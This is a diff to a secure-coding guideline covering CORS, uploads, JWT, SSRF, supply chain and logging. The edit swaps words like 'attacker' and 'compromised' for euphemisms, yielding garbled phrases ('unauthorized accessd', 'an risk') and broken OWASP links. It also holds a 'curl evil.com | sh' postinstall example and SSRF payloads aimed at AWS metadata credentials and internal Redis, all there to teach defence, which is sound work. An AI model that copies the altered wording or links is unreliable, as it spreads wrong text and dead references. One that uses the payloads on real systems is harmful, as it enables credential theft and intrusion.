@@ -27,15 +27,15 @@ Static code analysis (SAST) guidelines and secure coding standards aligned with 
 ## 1. API Security {#section-1}
 
 **Impact:** HIGH
-**Description:** APIs are the primary attack surface for modern applications. Rate limiting, CORS, schema validation, HTTPS enforcement, secure file uploads, and idempotency are essential first lines of defense.
+**Description:** Guidelines for designing robust and compliant web APIs. Focuses on rate limiting, schema validation, cross-origin configuration (CORS), secure transmission, and request idempotency.
 
 ## Configure CORS to Allow Only Trusted Origins
 
 **Impact: HIGH — CWE-346**
 
-Misconfigured CORS allows malicious websites to make authenticated cross-origin requests to your API on behalf of users (reading data, triggering actions). A wildcard `Access-Control-Allow-Origin: *` with `credentials: true` is a critical misconfiguration — browsers block it, but some setups inadvertently reflect the request origin, which has the same effect.
+Misconfigured CORS allows untrusted websites to make authenticated cross-origin requests to your API on behalf of users (reading data, triggering actions). A wildcard `Access-Control-Allow-Origin: *` with `credentials: true` is a critical misconfiguration — browsers block it, but some setups inadvertently reflect the request origin, which has the same effect.
 
-**Vulnerable (wildcard or reflected origin):**
+**Non-compliant (wildcard or reflected origin):**
 
 ```typescript
 // ❌ Wildcard — any website can call your API cross-origin
@@ -52,7 +52,7 @@ app.use((req, res, next) => {
   next()
 })
 
-// ❌ Weak origin validation — attacker uses evil.myapp.com
+// ❌ Weak origin validation — untrusted client uses evil.myapp.com
 const origin = req.headers.origin
 if (origin.includes('myapp.com')) {  // substring match is bypassable
   res.header('Access-Control-Allow-Origin', origin)
@@ -104,9 +104,9 @@ Reference: [OWASP CORS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatshee
 
 **Impact: HIGH — CWE-434**
 
-Unrestricted file uploads are one of the most dangerous vulnerabilities — they can lead to remote code execution (uploading web shells), stored XSS (uploading HTML/SVG with scripts), denial of service (uploading enormous files), and path traversal (overwriting critical files). The client-provided filename and MIME type cannot be trusted — attackers rename `shell.php` to `shell.jpg` and set the Content-Type to `image/jpeg`.
+Unrestricted file uploads are one of the most dangerous code gaps — they can lead to remote code execution (uploading web shells), stored XSS (uploading HTML/SVG with scripts), denial of service (uploading enormous files), and path traversal (overwriting critical files). The client-provided filename and MIME type cannot be trusted — untrusted clients rename `shell.php` to `shell.jpg` and set the Content-Type to `image/jpeg`.
 
-**Vulnerable (trusting client-provided file metadata):**
+**Non-compliant (trusting client-provided file metadata):**
 
 ```typescript
 // ❌ Trusting filename, MIME type, and size from the client
@@ -124,7 +124,7 @@ app.post('/api/upload', upload.single('file'), async (req, res) => {
   const finalPath = `public/uploads/${file.originalname}`
   await fs.rename(file.path, finalPath)
 
-  // File is now served at https://app.com/uploads/malicious.html
+  // File is now served at https://app.com/uploads/untrusted.html
   // If it contains <script>alert(document.cookie)</script> → stored XSS
   res.json({ url: `/uploads/${file.originalname}` })
 })
@@ -194,9 +194,9 @@ Reference: [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/ch
 
 **Impact: HIGH — CWE-319**
 
-Plaintext HTTP exposes all traffic — credentials, session tokens, and data — to network-level interception (MITM attacks). HSTS tells browsers to only connect via HTTPS, preventing downgrade attacks even when a user types `http://`. Redirect all HTTP traffic to HTTPS server-side.
+Plaintext HTTP exposes all traffic — credentials, session tokens, and data — to network-level interception (MITM risks). HSTS tells browsers to only connect via HTTPS, preventing downgrade risks even when a user types `http://`. Redirect all HTTP traffic to HTTPS server-side.
 
-**Vulnerable (HTTP allowed, no HSTS):**
+**Non-compliant (HTTP allowed, no HSTS):**
 
 ```typescript
 // ❌ No redirect from HTTP to HTTPS
@@ -262,7 +262,7 @@ Reference: [OWASP Transport Layer Security Cheat Sheet](https://cheatsheetseries
 
 Without idempotency protection, network retries, client bugs, or user double-clicks can cause duplicate payments, double order submissions, or repeated side effects. An idempotency key is a client-generated unique identifier sent with each request — the server processes the request once and returns the cached response for subsequent calls with the same key. This prevents financial loss, data corruption, and user frustration.
 
-**Vulnerable (no idempotency — duplicate processing):**
+**Non-compliant (no idempotency — duplicate processing):**
 
 ```typescript
 // ❌ No idempotency — retried requests charge the customer twice
@@ -343,19 +343,19 @@ Reference: [IETF Idempotency-Key Header RFC](https://datatracker.ietf.org/doc/dr
 
 **Impact: HIGH — CWE-770**
 
-Without rate limiting, attackers can brute-force passwords, enumerate accounts, scrape data, or overwhelm your service. Rate limiting is especially critical on authentication endpoints, password reset, and any resource-expensive operation. Apply different limits per endpoint type.
+Without rate limiting, untrusted clients can brute-force passwords, enumerate accounts, scrape data, or overwhelm your service. Rate limiting is especially critical on authentication endpoints, password reset, and any resource-expensive operation. Apply different limits per endpoint type.
 
-**Vulnerable (no rate limiting):**
+**Non-compliant (no rate limiting):**
 
 ```typescript
-// ❌ No limit — attacker can try millions of passwords
+// ❌ No limit — untrusted client can try millions of passwords
 app.post('/auth/login', async (req, res) => {
   const user = await verifyCredentials(req.body.email, req.body.password)
   if (!user) return res.status(401).json({ error: 'Invalid credentials' })
   res.json({ token: issueToken(user) })
 })
 
-// ❌ Password reset — attacker enumerates valid emails at will
+// ❌ Password reset — untrusted client enumerates valid emails at will
 app.post('/auth/forgot-password', async (req, res) => {
   await sendResetEmail(req.body.email)
   res.json({ success: true })
@@ -409,7 +409,7 @@ async function trackFailedLogin(userId: string) {
 
 Use Redis-backed stores so rate limits survive process restarts and work across multiple instances. Add Captcha for high-value auth endpoints as a second layer.
 
-Reference: [OWASP Blocking Brute Force Attacks](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks)
+Reference: [OWASP Blocking Brute Force Risks](https://owasp.org/www-community/controls/Blocking_Brute_Force_Risks)
 
 ---
 
@@ -417,12 +417,12 @@ Reference: [OWASP Blocking Brute Force Attacks](https://owasp.org/www-community/
 
 **Impact: HIGH — CWE-20**
 
-Unvalidated API requests allow attackers to send unexpected types, oversized payloads, or additional fields that bypass business logic, cause prototype pollution, or trigger mass assignment vulnerabilities. Schema validation enforces the contract between client and server and rejects malformed requests early.
+Unvalidated API requests allow untrusted clients to send unexpected types, oversized payloads, or additional fields that bypass business logic, cause prototype pollution, or trigger mass assignment code gaps. Schema validation enforces the contract between client and server and rejects malformed requests early.
 
-**Vulnerable (no schema validation):**
+**Non-compliant (no schema validation):**
 
 ```typescript
-// ❌ No validation — attacker sends { isAdmin: true, price: -100 }
+// ❌ No validation — untrusted client sends { isAdmin: true, price: -100 }
 app.post('/api/products', requireAuth, async (req, res) => {
   const product = await db.products.create({ data: req.body })  // mass assignment!
   res.json(product)
@@ -514,22 +514,22 @@ Reference: [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.or
 ## 2. Authentication & Authorization {#section-2}
 
 **Impact:** CRITICAL
-**Description:** Broken authentication and access control are the #1 and #2 most critical web vulnerabilities (OWASP A01/A07). Flaws here lead directly to account takeover, privilege escalation, SSRF, and full data breach.
+**Description:** Defines standards for user authentication, access control lists, and authorization verification (OWASP A01/A07). Promotes robust identity check patterns to prevent unauthorized access or privilege issues.
 
 ## Fully Validate JWT Signature, Algorithm, and Claims
 
 **Impact: CRITICAL — CWE-347**
 
-JWTs must be validated on every request: verify the signature, reject the `none` algorithm, enforce `alg` allowlist, and check `exp`, `iss`, and `aud` claims. Skipping any step allows attackers to forge tokens, elevate privileges, or reuse expired tokens.
+JWTs must be validated on every request: verify the signature, reject the `none` algorithm, enforce `alg` allowlist, and check `exp`, `iss`, and `aud` claims. Skipping any step allows untrusted clients to forge tokens, elevate privileges, or reuse expired tokens.
 
-**Vulnerable (incomplete validation):**
+**Non-compliant (incomplete validation):**
 
 ```typescript
 // ❌ Only decodes — does NOT verify signature
 import jwt from 'jsonwebtoken'
 const payload = jwt.decode(token) // trusts token blindly
 
-// ❌ Accepts 'none' algorithm — attacker can forge any payload
+// ❌ Accepts 'none' algorithm — untrusted client can forge any payload
 const payload = jwt.verify(token, secret) // if alg not locked down
 
 // ❌ No expiry, issuer, or audience check
@@ -580,9 +580,9 @@ Reference: [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheet
 
 **Impact: HIGH — CWE-308**
 
-Multi-factor authentication (MFA) dramatically reduces the risk of account takeover even when passwords are compromised. MFA should be mandatory for admin roles and strongly encouraged for all users. Step-up authentication (requiring MFA for specific high-risk actions) protects sensitive operations without constant friction.
+Multi-factor authentication (MFA) dramatically reduces the risk of account takeover even when passwords are unauthorized accessd. MFA should be mandatory for admin roles and strongly encouraged for all users. Step-up authentication (requiring MFA for specific high-risk actions) protects sensitive operations without constant friction.
 
-**Vulnerable (password-only auth for admin actions):**
+**Non-compliant (password-only auth for admin actions):**
 
 ```typescript
 // ❌ Admin action gated only by JWT role — no second factor
@@ -647,7 +647,7 @@ app.post('/api/admin/users/:id/delete',
 )
 ```
 
-Use TOTP (RFC 6238) as the primary second factor. Provide backup codes. Consider hardware keys (FIDO2/WebAuthn) for admin accounts. Never allow MFA bypass via SMS for high-security contexts (SIM-swap attacks).
+Use TOTP (RFC 6238) as the primary second factor. Provide backup codes. Consider hardware keys (FIDO2/WebAuthn) for admin accounts. Never allow MFA bypass via SMS for high-security contexts (SIM-swap risks).
 
 Reference: [OWASP Multifactor Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html)
 
@@ -657,12 +657,12 @@ Reference: [OWASP Multifactor Authentication Cheat Sheet](https://cheatsheetseri
 
 **Impact: CRITICAL — CWE-352 / CWE-601**
 
-OAuth flows without `state` parameter are vulnerable to CSRF attacks that can link an attacker's account to a victim's session. Without PKCE (Proof Key for Code Exchange), authorization codes can be intercepted and exchanged by a malicious app. Both mitigations are required for public clients and SPAs.
+OAuth flows without `state` parameter are non-compliant to CSRF risks that can link an untrusted client's account to a victim's session. Without PKCE (Proof Key for Code Exchange), authorization codes can be intercepted and exchanged by a untrusted app. Both mitigations are required for public clients and SPAs.
 
-**Vulnerable (no state, no PKCE):**
+**Non-compliant (no state, no PKCE):**
 
 ```typescript
-// ❌ No state parameter — CSRF attack can link attacker account to victim
+// ❌ No state parameter — CSRF risk can link untrusted client account to victim
 const authUrl = `https://provider.com/oauth/authorize
   ?client_id=${CLIENT_ID}
   &redirect_uri=${REDIRECT_URI}
@@ -727,9 +727,9 @@ Reference: [OWASP OAuth Cheat Sheet](https://cheatsheetseries.owasp.org/cheatshe
 
 **Impact: CRITICAL — CWE-916**
 
-Passwords must never be stored in plaintext or with fast hash functions (MD5, SHA-1, SHA-256). Fast hashes allow attackers to crack millions of passwords per second with GPU hardware after a database breach. bcrypt, Argon2id, or scrypt are intentionally slow and memory-hard, making brute-force infeasible.
+Passwords must never be stored in plaintext or with fast hash functions (MD5, SHA-1, SHA-256). Fast hashes allow untrusted clients to crack millions of passwords per second with GPU hardware after a database breach. bcrypt, Argon2id, or scrypt are intentionally slow and memory-hard, making brute-force infeasible.
 
-**Vulnerable (plaintext or weak hash):**
+**Non-compliant (plaintext or weak hash):**
 
 ```typescript
 // ❌ Storing plaintext password
@@ -775,9 +775,9 @@ Reference: [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.o
 
 **Impact: CRITICAL — CWE-285**
 
-Authorization must be checked server-side on every request. Never rely on the UI to hide privileged actions. Broken access control (OWASP #1) allows attackers to access other users' data, perform admin actions, or escalate privileges simply by changing a URL or role claim.
+Authorization must be checked server-side on every request. Never rely on the UI to hide privileged actions. Broken access control (OWASP #1) allows untrusted clients to access other users' data, perform admin actions, or escalate privileges simply by changing a URL or role claim.
 
-**Vulnerable (no server-side authorization):**
+**Non-compliant (no server-side authorization):**
 
 ```typescript
 // ❌ Only the frontend hides the admin button — no server check
@@ -788,7 +788,7 @@ app.delete('/api/users/:id', async (req, res) => {
 
 // ❌ Trusting a role from the client request body
 app.post('/api/report', async (req, res) => {
-  if (req.body.role === 'admin') {  // attacker controls this!
+  if (req.body.role === 'admin') {  // untrusted client controls this!
     return sendFullReport(res)
   }
 })
@@ -840,9 +840,9 @@ Reference: [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org
 
 **Impact: CRITICAL — CWE-614**
 
-Session cookies without `HttpOnly` can be stolen via XSS. Without `Secure`, they travel over plaintext HTTP. Without `SameSite=Strict` or `Lax`, they are sent on cross-site requests enabling CSRF attacks. All three attributes are required.
+Session cookies without `HttpOnly` can be stolen via XSS. Without `Secure`, they travel over plaintext HTTP. Without `SameSite=Strict` or `Lax`, they are sent on cross-site requests enabling CSRF risks. All three attributes are required.
 
-**Vulnerable (missing cookie security attributes):**
+**Non-compliant (missing cookie security attributes):**
 
 ```typescript
 // ❌ Cookie readable by JavaScript — XSS can steal session
@@ -851,7 +851,7 @@ res.cookie('sessionId', token)
 // ❌ No Secure flag — sent over HTTP
 res.cookie('sessionId', token, { httpOnly: true })
 
-// ❌ No SameSite — CSRF vulnerable
+// ❌ No SameSite — CSRF non-compliant
 res.cookie('sessionId', token, { httpOnly: true, secure: true })
 ```
 
@@ -899,19 +899,19 @@ Reference: [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp
 
 **Impact: CRITICAL — CWE-918**
 
-Server-Side Request Forgery (SSRF) occurs when an application fetches a URL provided by the user without validating the destination. Attackers exploit this to access internal services (metadata APIs, databases, admin panels), scan private networks, or exfiltrate data through the server. SSRF was OWASP A10 in 2021 and remains a top threat — the 2019 Capital One breach was caused by SSRF targeting the AWS metadata endpoint.
+Server-Side Request Forgery (SSRF) occurs when an application fetches a URL provided by the user without validating the destination. Untrusted clients abuse this to access internal services (metadata APIs, databases, admin panels), scan private networks, or exfiltrate data through the server. SSRF was OWASP A10 in 2021 and remains a top threat — the 2019 Capital One breach was caused by SSRF targeting the AWS metadata endpoint.
 
-**Vulnerable (unvalidated URL from user input):**
+**Non-compliant (unvalidated URL from user input):**
 
 ```typescript
 // ❌ Fetches any URL the user provides — including internal services
 app.post('/api/preview', async (req, res) => {
   const { url } = req.body
 
-  // Attacker sends: url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-  // → Server fetches AWS IAM credentials and returns them to the attacker
+  // Untrusted client sends: url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+  // → Server fetches AWS IAM credentials and returns them to the untrusted client
 
-  // Attacker sends: url = "http://10.0.0.5:6379/CONFIG+SET+dir+/var/www/html"
+  // Untrusted client sends: url = "http://10.0.0.5:6379/CONFIG+SET+dir+/var/www/html"
   // → Server sends commands to internal Redis
 
   const response = await fetch(url)
@@ -920,7 +920,7 @@ app.post('/api/preview', async (req, res) => {
 })
 
 // ❌ DNS rebinding bypasses hostname checks
-// Attacker's DNS returns 1.2.3.4 on first lookup (passes validation)
+// Untrusted client's DNS returns 1.2.3.4 on first lookup (passes validation)
 // then 169.254.169.254 on second lookup (actual fetch hits metadata API)
 ```
 
@@ -982,12 +982,12 @@ Reference: [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.or
 
 **Impact: CRITICAL — CWE-613**
 
-Long-lived access tokens give attackers a large window to exploit a stolen token. Access tokens should expire in minutes (15 min max). Refresh tokens should be single-use with rotation — when a refresh token is used, issue a new one and invalidate the old. This limits blast radius and detects token theft (reuse of a rotated token signals compromise).
+Long-lived access tokens give untrusted clients a large window to abuse a stolen token. Access tokens should expire in minutes (15 min max). Refresh tokens should be single-use with rotation — when a refresh token is used, issue a new one and invalidate the old. This limits impact area and detects token theft (reuse of a rotated token signals unauthorized access).
 
-**Vulnerable (long-lived non-rotating tokens):**
+**Non-compliant (long-lived non-rotating tokens):**
 
 ```typescript
-// ❌ Token valid for 30 days — stolen token compromises account for weeks
+// ❌ Token valid for 30 days — stolen token unauthorized accesss account for weeks
 const token = jwt.sign({ userId: user.id }, JWT_SECRET, {
   expiresIn: '30d',
 })
@@ -1042,7 +1042,7 @@ app.post('/auth/refresh', async (req, res) => {
 })
 ```
 
-Store refresh tokens server-side (not in JWTs). Detect reuse of rotated tokens as a signal of compromise and revoke all sessions for the user.
+Store refresh tokens server-side (not in JWTs). Detect reuse of rotated tokens as a signal of unauthorized access and revoke all sessions for the user.
 
 Reference: [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
 
@@ -1051,7 +1051,7 @@ Reference: [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp
 ## 3. Data Protection & Cryptography {#section-3}
 
 **Impact:** HIGH
-**Description:** Sensitive data must be encrypted at rest and in transit using modern algorithms (OWASP A04). Collect only what is needed; mask PII in all non-production contexts.
+**Description:** Encryption and data minimization guidelines (OWASP A04). Focuses on protecting data at rest and in transit using strong cryptographic algorithms, plus masking personal identifiable information (PII).
 
 ## Encrypt Sensitive Data at Rest with AES-256
 
@@ -1059,7 +1059,7 @@ Reference: [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp
 
 A database breach exposes unencrypted PII (SSNs, health records, payment data) in plaintext. Encrypt sensitive fields at the application layer with AES-256-GCM, so even a full database dump is useless without the encryption key. This is distinct from TLS in transit — encryption at rest protects against database exfiltration, backup theft, and insider threats.
 
-**Vulnerable (PII stored in plaintext):**
+**Non-compliant (PII stored in plaintext):**
 
 ```typescript
 // ❌ SSN, card number, health data stored in plaintext
@@ -1128,7 +1128,7 @@ Reference: [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.ow
 
 Every piece of PII you collect is a liability. Data breaches expose what you store. GDPR Article 5 and CCPA require collecting only data that is adequate, relevant, and limited to what is necessary. Unused data fields increase your breach impact, compliance scope, and regulatory risk.
 
-**Vulnerable (over-collection):**
+**Non-compliant (over-collection):**
 
 ```typescript
 // ❌ Collecting far more than needed for a newsletter signup
@@ -1198,7 +1198,7 @@ Reference: [GDPR Article 5 — Data Minimization](https://gdpr.eu/article-5-how-
 
 Logs are frequently shared with third parties (Datadog, Splunk, Sentry), stored insecurely, or accessed by developers who should not see production PII. Logging full email addresses, SSNs, card numbers, or tokens creates privacy and compliance violations (GDPR, HIPAA, PCI-DSS). Mask or redact before any log output.
 
-**Vulnerable (PII in logs):**
+**Non-compliant (PII in logs):**
 
 ```typescript
 // ❌ Full PII logged
@@ -1275,9 +1275,9 @@ Reference: [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheats
 
 **Impact: HIGH — CWE-319**
 
-Data transmitted without TLS or with deprecated versions (TLS 1.0, 1.1, SSL 3.0) is vulnerable to interception, man-in-the-middle attacks, and protocol downgrade attacks (BEAST, POODLE, CRIME). All communication — between client and server, between microservices, and to databases — must use TLS 1.2 or higher. TLS 1.0 and 1.1 were officially deprecated by RFC 8996 in March 2021.
+Data transmitted without TLS or with deprecated versions (TLS 1.0, 1.1, SSL 3.0) is non-compliant to interception, man-in-the-middle risks, and protocol downgrade risks (BEAST, POODLE, CRIME). All communication — between client and server, between microservices, and to databases — must use TLS 1.2 or higher. TLS 1.0 and 1.1 were officially deprecated by RFC 8996 in March 2021.
 
-**Vulnerable (no TLS or deprecated versions):**
+**Non-compliant (no TLS or deprecated versions):**
 
 ```typescript
 // ❌ HTTP connection to database — credentials sent in plain text
@@ -1346,15 +1346,15 @@ Reference: [OWASP TLS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheet
 ## 4. Dependency & Supply Chain Security {#section-4}
 
 **Impact:** MEDIUM-HIGH
-**Description:** Third-party packages are a major vector for supply chain attacks (OWASP A03/A08). Audit dependencies regularly, pin versions via lock files, and minimize the attack surface.
+**Description:** Standards for managing third-party libraries and packages (OWASP A03/A08). Focuses on auditing dependencies, locking versions, and minimizing external code footprint.
 
 ## Audit Dependencies and Run Security Checks in CI
 
 **Impact: MEDIUM-HIGH — CWE-1104**
 
-Third-party packages are a major breach vector — the 2020 SolarWinds attack and thousands of npm package hijacks demonstrate that dependencies must be treated as untrusted code. Automated auditing in CI ensures known vulnerabilities are caught before deployment.
+Third-party packages are a major breach vector — the 2020 SolarWinds risk and thousands of npm package hijacks demonstrate that dependencies must be treated as untrusted code. Automated auditing in CI ensures known code gaps are caught before deployment.
 
-**Vulnerable (no dependency auditing):**
+**Non-compliant (no dependency auditing):**
 
 ```bash
 # ❌ Never auditing dependencies
@@ -1384,7 +1384,7 @@ jobs:
       - name: npm audit (fail on high+)
         run: npm audit --audit-level=high
 
-      - name: Snyk vulnerability scan
+      - name: Snyk code gap scan
         uses: snyk/actions/node@master
         env:
           SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
@@ -1413,9 +1413,9 @@ npm audit fix --force      # semver-major updates (review manually)
 npm audit                  # list all issues without fixing
 ```
 
-Set a policy: CRITICAL/HIGH vulnerabilities block deployment; MEDIUM vulnerabilities have a 30-day SLA. Use Dependabot or Renovate for automatic dependency update PRs.
+Set a policy: CRITICAL/HIGH code gaps block deployment; MEDIUM code gaps have a 30-day SLA. Use Dependabot or Renovate for automatic dependency update PRs.
 
-Reference: [OWASP Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
+Reference: [OWASP Non-compliant and Outdated Components](https://owasp.org/Top10/A06_2021-Non-compliant_and_Outdated_Components/)
 
 ---
 
@@ -1423,9 +1423,9 @@ Reference: [OWASP Vulnerable and Outdated Components](https://owasp.org/Top10/A0
 
 **Impact: MEDIUM-HIGH — CWE-494**
 
-Lock files (`package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`) pin exact versions and integrity checksums of every dependency. Without them, `npm install` can silently pull newer (potentially compromised) versions. In CI, use `npm ci` (not `npm install`) to enforce the lock file and fail if it's out of sync.
+Lock files (`package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`) pin exact versions and integrity checksums of every dependency. Without them, `npm install` can silently pull newer (potentially unauthorized accessd) versions. In CI, use `npm ci` (not `npm install`) to enforce the lock file and fail if it's out of sync.
 
-**Vulnerable (no lock file enforcement):**
+**Non-compliant (no lock file enforcement):**
 
 ```bash
 # ❌ .gitignore includes lock files — every install can differ
@@ -1469,7 +1469,7 @@ jobs:
 ```
 
 ```bash
-# ✅ Audit lock file for known compromised packages
+# ✅ Audit lock file for known unauthorized accessd packages
 npx better-npm-audit audit
 # or
 npm audit --package-lock-only
@@ -1480,7 +1480,7 @@ npm audit --package-lock-only
 #         crossorigin="anonymous"></script>
 ```
 
-Enable Dependabot version updates to keep the lock file current automatically. Review lock file diffs in PRs — unexpected version changes can signal supply chain attacks.
+Enable Dependabot version updates to keep the lock file current automatically. Review lock file diffs in PRs — unexpected version changes can signal supply chain risks.
 
 Reference: [npm ci documentation](https://docs.npmjs.com/cli/v10/commands/npm-ci)
 
@@ -1490,21 +1490,21 @@ Reference: [npm ci documentation](https://docs.npmjs.com/cli/v10/commands/npm-ci
 
 **Impact: MEDIUM-HIGH — CWE-1104**
 
-Each dependency you add transitively introduces dozens more packages, each a potential attack vector. Packages with wide permissions (filesystem, network, shell access), low maintenance activity, or a single maintainer are high-risk. Evaluate packages before adding them.
+Each dependency you add transitively introduces dozens more packages, each a potential risk vector. Packages with wide permissions (filesystem, network, shell access), low maintenance activity, or a single maintainer are high-risk. Evaluate packages before adding them.
 
-**Vulnerable (unnecessary broad dependencies):**
+**Non-compliant (unnecessary broad dependencies):**
 
 ```bash
 # ❌ Installing lodash for one utility function
 npm install lodash         # 100+ functions — adds 70kB to bundle
 
 # ❌ Package with excessive permissions
-# package.json (malicious package)
+# package.json (untrusted package)
 # "scripts": { "postinstall": "curl evil.com | sh" }
 
 # ❌ Using a package with known issues and no recent maintenance
 npm install left-pad       # famous example of fragile supply chain
-npm install event-stream   # was compromised in 2018 to steal Bitcoin
+npm install event-stream   # was unauthorized accessd in 2018 to steal Bitcoin
 ```
 
 **Secure (minimal, audited dependencies):**
@@ -1549,7 +1549,7 @@ Reference: [OWASP Software Component Verification Standard](https://owasp.org/ww
 ## 5. Secure Design {#section-5}
 
 **Impact:** HIGH
-**Description:** Insecure design cannot be fixed by code review alone (OWASP A06). Threat models, STRIDE analysis, and abuse case documentation during the design phase prevent architectural flaws that no amount of secure coding can fix.
+**Description:** Architectural review guidelines and threat modeling standards (OWASP A06). Promotes secure design principles, access control planning, and threat assessments during the design phase of new features.
 
 ## Require Threat Models for New Features and Services
 
@@ -1557,7 +1557,7 @@ Reference: [OWASP Software Component Verification Standard](https://owasp.org/ww
 
 Insecure design cannot be fixed by code review alone — it requires identifying threats before writing code. Without threat modeling, teams discover security flaws in production (or not at all). A lightweight STRIDE-based threat model during design forces explicit thinking about trust boundaries, data flows, and abuse scenarios. This is the primary defense against OWASP A06 "Insecure Design" — the category that captures architectural flaws no amount of secure coding can fix.
 
-**Vulnerable (no threat model — security discovered too late):**
+**Non-compliant (no threat model — security discovered too late):**
 
 ```typescript
 // ❌ Feature designed and built without threat analysis
@@ -1565,7 +1565,7 @@ Insecure design cannot be fixed by code review alone — it requires identifying
 //
 // What the team missed:
 //   - No expiry on share links → permanent access even after revocation intent
-//   - Sequential share IDs → attacker can enumerate all shared files
+//   - Sequential share IDs → untrusted client can enumerate all shared files
 //   - No access logging → breach goes undetected
 //   - No rate limiting on link creation → mass exfiltration tool
 //   - Shared files include metadata with internal user IDs
@@ -1598,7 +1598,7 @@ User → API Gateway → Share Service → Object Storage
 
 | Threat | Category | Mitigation |
 |--------|----------|------------|
-| Attacker guesses share IDs | Spoofing | Use UUID v4 (128-bit random), not sequential IDs |
+| Untrusted client guesses share IDs | Spoofing | Use UUID v4 (128-bit random), not sequential IDs |
 | Revoked link still works | Tampering | Expire links after 7 days, support manual revocation |
 | No record of who accessed | Repudiation | Log every access with IP, user-agent, timestamp |
 | Shared file leaks metadata | Information Disclosure | Strip internal metadata before serving |
@@ -1606,7 +1606,7 @@ User → API Gateway → Share Service → Object Storage
 | Link bypasses file permissions | Elevation of Privilege | Verify sharer still has access on every link use |
 
 ## Abuse Cases
-- Attacker creates thousands of share links to exfiltrate entire drive
+- Untrusted client creates thousands of share links to exfiltrate entire drive
 - Former employee's share links remain active after account deletion
 - Search engines index share links, making files publicly discoverable
 ```
@@ -1634,7 +1634,7 @@ Reference: [OWASP Threat Modeling Cheat Sheet](https://cheatsheetseries.owasp.or
 ## 6. Error Handling & Logging {#section-6}
 
 **Impact:** MEDIUM
-**Description:** Improper error handling leaks system internals to attackers and causes resource exhaustion (OWASP A09/A10). Security events must be logged without capturing sensitive data. Resources must be cleaned up in all code paths.
+**Description:** Guidelines for robust error management and event logging (OWASP A09/A10). Prevents exposing stack traces or internal implementation details, and ensures clean resource release in all scenarios.
 
 ## Implement Circuit Breakers and Graceful Degradation
 
@@ -1642,7 +1642,7 @@ Reference: [OWASP Threat Modeling Cheat Sheet](https://cheatsheetseries.owasp.or
 
 When a downstream service fails, applications that retry aggressively without backoff can amplify the failure into a cascading outage — overwhelming the struggling service, exhausting their own connection pools, and becoming unresponsive. A circuit breaker detects repeated failures and "opens" to stop sending requests, returning a fallback response instead. This protects both the downstream service (time to recover) and the calling application (remains responsive).
 
-**Vulnerable (no circuit breaker — cascading failure):**
+**Non-compliant (no circuit breaker — cascading failure):**
 
 ```typescript
 // ❌ Unbounded retries — amplifies downstream failures
@@ -1716,9 +1716,9 @@ Reference: [Microsoft Circuit Breaker Pattern](https://learn.microsoft.com/en-us
 
 **Impact: MEDIUM — CWE-532**
 
-Log files are often stored with weaker access controls than production databases — aggregated in centralized logging systems, backed up to less secure storage, and accessible to broader engineering teams. Logging passwords, API keys, JWTs, credit card numbers, or PII gives attackers who gain access to logs a direct path to credentials and personal data. It also creates GDPR/PCI-DSS compliance violations.
+Log files are often stored with weaker access controls than production databases — aggregated in centralized logging systems, backed up to less secure storage, and accessible to broader engineering teams. Logging passwords, API keys, JWTs, credit card numbers, or PII gives untrusted clients who gain access to logs a direct path to credentials and personal data. It also creates GDPR/PCI-DSS compliance violations.
 
-**Vulnerable (sensitive data in logs):**
+**Non-compliant (sensitive data in logs):**
 
 ```typescript
 // ❌ Logging the entire request body — includes passwords and tokens
@@ -1793,9 +1793,9 @@ Reference: [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheats
 
 **Impact: MEDIUM — CWE-209**
 
-Stack traces reveal file paths, framework versions, library names, database schemas, and internal logic — a reconnaissance goldmine for attackers. In production, return only a generic error message to clients; log the full details server-side with a correlation ID so engineers can debug.
+Stack traces reveal file paths, framework versions, library names, database schemas, and internal logic — a reconnaissance goldmine for untrusted clients. In production, return only a generic error message to clients; log the full details server-side with a correlation ID so engineers can debug.
 
-**Vulnerable (exposing internals):**
+**Non-compliant (exposing internals):**
 
 ```typescript
 // ❌ Default Express error handler — sends full stack to client
@@ -1870,7 +1870,7 @@ Reference: [OWASP Error Handling Cheat Sheet](https://cheatsheetseries.owasp.org
 
 Resources like database connections, file handles, network sockets, and encryption contexts must be released even when exceptions occur. Leaked resources exhaust connection pools, fill file descriptor tables, and eventually crash the application. In high-traffic systems, a single missing `finally` block can cause a denial-of-service condition within hours as the connection pool drains to zero.
 
-**Vulnerable (resources leaked on exception):**
+**Non-compliant (resources leaked on exception):**
 
 ```typescript
 // ❌ Database connection leaked if query throws
@@ -1948,9 +1948,9 @@ Reference: [CWE-404: Improper Resource Shutdown or Release](https://cwe.mitre.or
 
 **Impact: MEDIUM — CWE-778**
 
-Security events that are not logged cannot be detected or investigated. Without an audit trail, breaches go undetected for months (industry average: 207 days). Log all authentication events — success and failure — with enough context to reconstruct the timeline of an attack. Feed logs to a SIEM for alerting.
+Security events that are not logged cannot be detected or investigated. Without an audit trail, breaches go undetected for months (industry average: 207 days). Log all authentication events — success and failure — with enough context to reconstruct the timeline of an risk. Feed logs to a SIEM for alerting.
 
-**Vulnerable (no security event logging):**
+**Non-compliant (no security event logging):**
 
 ```typescript
 // ❌ Login endpoint with no logging
@@ -2033,15 +2033,15 @@ Reference: [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheats
